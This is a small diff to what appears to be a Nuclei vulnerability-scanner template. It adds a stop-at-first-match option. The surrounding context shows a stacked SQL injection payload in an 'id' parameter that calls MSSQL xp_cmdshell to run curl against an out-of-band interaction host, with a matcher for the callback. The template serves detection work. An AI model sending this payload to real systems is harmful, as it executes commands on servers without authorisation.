@@ -19,6 +19,7 @@ http:
     path:
       - "{{BaseURL}}/?id=1; exec master..xp_cmdshell 'curl http://{{interactsh-url}}'--"
 
+    stop-at-first-match: true
     matchers:
       - type: word
         part: interactsh_protocol
